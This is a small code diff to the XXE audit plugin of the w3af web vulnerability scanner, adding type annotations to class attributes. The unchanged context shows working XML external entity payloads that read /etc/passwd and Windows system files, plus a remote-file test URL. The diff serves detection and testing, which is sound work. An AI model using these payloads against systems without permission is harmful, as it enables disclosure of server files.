@@ -21,6 +21,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 
 import itertools
+from typing import ClassVar
 
 from lxml import etree
 
@@ -41,16 +42,16 @@ class xxe(AuditPlugin):
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
 
-    WINDOWS_FILES = [
+    WINDOWS_FILES: ClassVar = [
         "%SYSTEMDRIVE%\\boot.ini",
         "%WINDIR%\\win.ini",
     ]
 
-    LINUX_FILES = [
+    LINUX_FILES: ClassVar = [
         "/etc/passwd",
     ]
 
-    REMOTE_FILES = ["http://w3af.org/xxe.txt"]
+    REMOTE_FILES: ClassVar = ["http://w3af.org/xxe.txt"]
 
     # This is the only content stored in the https://w3af.org/xxe.txt file
     REMOTE_SUCCESS = "667067323"
@@ -58,7 +59,7 @@ class xxe(AuditPlugin):
     ENTITY_DEF = '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]>'
     ENTITY = "&xxe_test;"
 
-    GENERIC_PAYLOADS = [
+    GENERIC_PAYLOADS: ClassVar = [
         # This is the most effective payload I've found until now, tested using
         # libxml (python wrapper, but should apply to all libxml versions).
         '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]><x>&xxe_test;</x>',
@@ -73,16 +74,16 @@ class xxe(AuditPlugin):
         ),
     ]
 
-    LINUX_PAYLOADS = [
+    LINUX_PAYLOADS: ClassVar = [
         '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file://%s"> ]><x>&xxe_test;</x>',
     ]
 
-    WINDOWS_PAYLOADS = [
+    WINDOWS_PAYLOADS: ClassVar = [
         # Note that this one uses file:/// instead of file://
         '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///%s"> ]><x>&xxe_test;</x>',
     ]
 
-    XML_PARSER_ERRORS = [
+    XML_PARSER_ERRORS: ClassVar = [
         # PHP
         "xmlParseEntityDecl",
         "simplexml_load_string",
